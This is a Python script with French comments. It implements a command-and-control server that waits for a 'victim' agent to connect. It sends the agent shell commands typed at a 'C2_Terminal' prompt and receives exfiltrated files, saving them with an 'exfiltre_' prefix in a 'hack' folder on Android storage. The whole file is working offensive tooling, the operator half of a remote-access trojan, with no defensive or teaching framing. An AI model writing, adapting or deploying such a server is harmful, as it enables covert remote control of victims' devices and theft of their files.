import socket
import os

# --- CONFIGURATION ---
HOST = '0.0.0.0' # Écoute sur toutes les interfaces réseau
PORT = 8080
WORKING_DIR = "/storage/emulated/0/hack"

def recevoir_fichier(conn, nom_fichier):
    """Reçoit un fichier binaire et le sauvegarde avec un préfixe."""
    nom_final = "exfiltre_" + nom_fichier
    print(f"[*] Réception de {nom_fichier} en cours...")
    
    with open(nom_final, "wb") as f:
        while True:
            octets = conn.recv(4096)
            # Vérification du marqueur de fin envoyé par l'agent
            if octets.endswith(b"TRANSFERT_TERMINE"):
                f.write(octets[:-17]) # On retire le marqueur du fichier final
                break
            f.write(octets)
            
    print(f"[+] Succès : Fichier sauvegardé sous {nom_final} ({os.path.getsize(nom_final)} octets)")

def demarrer_C2():
    # On se place dans le dossier de travail pour retrouver les fichiers exfiltrés
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)
    os.chdir(WORKING_DIR)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Option pour éviter l'erreur "Address already in use"
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"--- SERVEUR C2 ACTIF ---")
        print(f"[*] En attente de connexion sur le port {PORT}...")
        
        conn, addr = s.accept()
        print(f"[+] VICTIME CONNECTÉE : {addr}")

        while True:
            commande = input("C2_Terminal > ").strip()
            
            if not commande:
                continue
            
            # Envoi de la commande à l'agent
            conn.send(commande.encode())

            if commande.lower() == "quitter":
                break

            # Cas particulier : Exfiltration
            if commande.startswith("download"):
                try:
                    nom_f = commande.split(" ")[1]
                    recevoir_fichier(conn, nom_f)
                except IndexError:
                    print("[!] Usage : download <nom_du_fichier>")
            
            # Cas général : Retour de commande texte
            else:
                reponse = conn.recv(16384).decode() # Buffer large pour les longs résultats (ex: ls -R)
                print(f"\n[RÉSULTAT] :\n{reponse}\n")

    except Exception as e:
        print(f"[!] Erreur Serveur : {e}")
    finally:
        s.close()
        print("[*] Serveur arrêté proprement.")

if __name__ == "__main__":
    demarrer_C2()
